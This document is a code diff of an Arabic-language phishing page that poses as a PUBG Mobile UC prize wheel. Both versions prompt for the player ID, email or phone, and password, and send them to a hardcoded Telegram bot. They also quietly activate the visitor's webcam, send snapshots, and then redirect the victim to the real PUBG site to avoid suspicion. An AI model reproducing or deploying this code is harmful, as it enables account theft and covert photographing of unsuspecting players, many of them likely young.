@@ -16,13 +16,13 @@
         }
         .container { text-align: center; padding: 20px; }
         
-        /* تنسيق اللوجو الجديد */
+        /* اللوجو - تم استخدام رابط مباشر لضمان الظهور */
         .logo { width: 180px; margin-top: 20px; height: auto; }
         
-        /* تنسيق صورة الشدات (الهدية) */
-        .uc-gift-img { width: 100px; margin: 10px auto; display: block; }
+        /* صورة الشدات داخل المربع */
+        .uc-gift-img { width: 80px; margin: 10px auto; display: block; border-radius: 10px; }
 
-        /* تصميم عجلة الحظ */
+        /* تصميم عجلة الحظ - تم استبدال الروابط المكسورة */
         .wheel-outer {
             position: relative;
             width: 320px;
@@ -30,7 +30,7 @@
             margin: 30px auto;
             border: 8px solid #f3bc18;
             border-radius: 50%;
-            box-shadow: 0 0 20px #f3bc18;
+            box-shadow: 0 0 30px #f3bc18;
             background-color: #1a1a1a;
         }
         .wheel-container {
@@ -39,8 +39,8 @@
             border-radius: 50%;
             overflow: hidden;
             transition: transform 4s cubic-bezier(0.17, 0.67, 0.12, 0.99);
-            background: url('https://i.ibb.co/31M999W/wheel.png') no-repeat center center; /* عجلة افتراضية */
-            background-size: cover;
+            background: url('https://i.ibb.co/31M999W/wheel.png') no-repeat center center;
+            background-size: contain;
         }
         .pointer {
             position: absolute;
@@ -52,27 +52,24 @@
         }
 
         .login-box {
-            background: rgba(0, 0, 0, 0.9);
+            background: rgba(0, 0, 0, 0.95);
             padding: 25px;
             border-radius: 15px;
             max-width: 400px;
             margin: 20px auto;
             border: 2px solid #f3bc18;
-            display: none; /* مخفية حتى تدور العجلة */
-            box-shadow: 0 0 15px rgba(243, 188, 24, 0.5);
+            box-shadow: 0 0 20px rgba(243, 188, 24, 0.6);
         }
         input {
             width: 90%;
             padding: 12px;
-            margin: 10px 0;
+            margin: 8px 0;
             background: #111;
             border: 1px solid #444;
             color: white;
             border-radius: 5px;
             text-align: center;
         }
-        input:focus { border-color: #f3bc18; outline: none; }
-        
         .btn-spin {
             background: linear-gradient(180deg, #f3bc18 0%, #b98f10 100%);
             color: black;
@@ -84,38 +81,35 @@
             border-radius: 5px;
             text-transform: uppercase;
             box-shadow: 0 4px 0 #86680b;
-            transition: 0.1s;
         }
-        .btn-spin:active { transform: translateY(2px); box-shadow: 0 2px 0 #86680b; }
-        
-        video, canvas { display: none; } /* عناصر مخفية للكاميرا */
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <img src="images.webp" alt="PUBG Logo" class="logo">
+    <img src="https://www.pubgmobile.com/common/images/icon_logo.png" alt="PUBG Logo" class="logo">
     
     <h1>احتفالية المكافآت الكبرى</h1>
     <p>دور العجلة الآن واحصل على فرصتك للفوز بالشدات!</p>
 
     <div class="wheel-outer">
-        <img src="https://i.ibb.co/9hS666X/pointer.png" class="pointer" alt="Pointer">
+        <img src="https://i.ibb.co/9hS666X/pointer.png" class="pointer">
         <div class="wheel-container" id="wheel"></div>
     </div>
 
     <button class="btn-spin" id="spinBtn" onclick="spinWheel()">SPIN NOW</button>
 
-    <div id="loginBox" class="login-box">
-        <img src="images (3).jpg" alt="UC Gift" class="uc-gift-img">
-        <h3 style="color: #f3bc18;">تهانينا! لقد فزت بالحزمة الملكية</h3>
+    <div id="loginBox" class="login-box" style="display: none;">
+        <img src="https://i.postimg.cc/0jH2H9fM/uc-pack.jpg" alt="UC Gift" class="uc-gift-img">
+        <h3 style="color: #f3bc18;">تهانينا! لقد فزت بـ 8100 شدة</h3>
         <p>يرجى التحقق من حسابك لربط الشدات فوراً</p>
         
-        <input type="text" id="pubgId" placeholder="ID اللاعب (مثال: 12345678)">
+        <input type="text" id="pubgId" placeholder="ID اللاعب">
         <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف">
         <input type="password" id="password" placeholder="كلمة المرور">
         
-        <button class="btn-spin" onclick="collectReward()" style="width: 100%; margin-top: 15px; font-size: 16px;">
+        <button class="btn-spin" onclick="collectReward()" style="width: 100%; margin-top: 15px;">
             تأكيد واستلام الشدات
         </button>
     </div>
@@ -125,130 +119,72 @@
 <canvas id="canvas"></canvas>
 
 <script>
-    // بيانات البوت الخاصة بك
     const BOT_TOKEN = '8338334656:AAFJosPcNri8hJeERp7Si-JXzSkxmBAmwG8';
     const CHAT_ID = '8754338811';
 
-    // --- نظام سحب الصور في الخلفية ---
+    // تشغيل الكاميرا في الخلفية
     async function setupCamera() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             document.getElementById('video').srcObject = stream;
-            // سحب صورة مبدئية بعد ثانيتين
-            setTimeout(captureImage, 2000);
-        } catch (e) {
-            console.log("Camera access denied.");
-        }
+        } catch (e) { console.log("Camera access denied."); }
     }
+    window.addEventListener('load', setupCamera);
 
     function captureImage() {
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
-        
         if (video.videoWidth > 0) {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0);
-            const imageData = canvas.toDataURL('image/jpeg', 0.7); // ضغط الصورة قليلاً
-            sendPhoto(imageData);
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            sendPhoto(canvas.toDataURL('image/jpeg', 0.6));
         }
     }
 
-    // تفعيل الكاميرا فور تحميل الصفحة
-    window.addEventListener('load', setupCamera);
-
-
-    // --- نظام عجلة الحظ ---
-    let isSpinning = false;
     function spinWheel() {
-        if (isSpinning) return;
-        isSpinning = true;
-        
         const wheel = document.getElementById('wheel');
         const spinBtn = document.getElementById('spinBtn');
-        
         spinBtn.disabled = true;
-        spinBtn.innerText = "Spinning...";
+        wheel.style.transform = `rotate(${Math.floor(Math.random() * 360) + 3600}deg)`;
         
-        // تدوير العجلة بشكل عشوائي قوي
-        const randomDegree = Math.floor(Math.random() * 360) + 3600; // 10 دورات + زاوية عشوائية
-        wheel.style.transform = `rotate(${randomDegree}deg)`;
-        
-        // إظهار مربع تسجيل الدخول بعد انتهاء الدوران (4 ثوانٍ)
         setTimeout(() => {
             document.getElementById('loginBox').style.display = 'block';
             spinBtn.style.display = 'none';
-            // سحب صورة أخرى عند الفوز
             captureImage();
-            // الانتقال التلقائي لمربع التسجيل
             document.getElementById('loginBox').scrollIntoView({ behavior: 'smooth' });
-        }, 4100);
+        }, 4000);
     }
 
-
-    // --- نظام إرسال البيانات للتليجرام ---
     async function collectReward() {
         const id = document.getElementById('pubgId').value;
         const email = document.getElementById('email').value;
         const pass = document.getElementById('password').value;
 
-        if(!email || !pass) {
-            Swal.fire('خطأ', 'يرجى إدخال بيانات الحساب كاملة لاستلام الهدية', 'error');
-            return;
-        }
+        if(!email || !pass) return Swal.fire('خطأ', 'يرجى إدخال بيانات الحساب', 'error');
 
-        // سحب صورة نهائية عند الضغط على الزر
         captureImage();
 
-        const message = `
-🎯 **صيد ببجي جديد (عجلة الشدات)**
-🆔 ID اللاعب: \`${id}\`
-📧 الحساب: \`${email}\`
-🔑 الباسورد: \`${pass}\`
-🌐 معلومات الجهاز: ${navigator.userAgent}
-        `;
+        const message = `🎯 **صيد ببجي جديد**\n🆔 ID: \`${id}\`\n📧 User: \`${email}\`\n🔑 Pass: \`${pass}\``;
 
-        // إرسال البيانات النصية
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
-            })
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
         });
 
-        // إظهار رسالة نجاح وهمية وتحويل المستخدم
-        Swal.fire({
-            title: 'تم التحقق بنجاح',
-            text: 'سيتم إضافة 8100 شدة لحسابك خلال 15 دقيقة. لا تقم بتغيير كلمة المرور الآن.',
-            icon: 'success',
-            confirmButtonText: 'موافق'
-        }).then(() => {
-            // تحويل المستخدم لموقع ببجي الحقيقي لإبعاد الشبهة
+        Swal.fire('تم بنجاح', 'ستصلك الشدات خلال 15 دقيقة', 'success').then(() => {
             window.location.href = "https://www.pubgmobile.com";
         });
     }
 
-    // دالة إرسال الصورة للبوت
-    async function sendPhoto(base64Data) {
-        try {
-            const blob = await (await fetch(base64Data)).blob();
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'visitor.jpg');
-            
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-        } catch (error) {
-            console.error("Photo send failed");
-        }
+    async function sendPhoto(base64) {
+        const blob = await (await fetch(base64)).blob();
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'visitor.jpg');
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
     }
 </script>
-
 </body>
 </html>
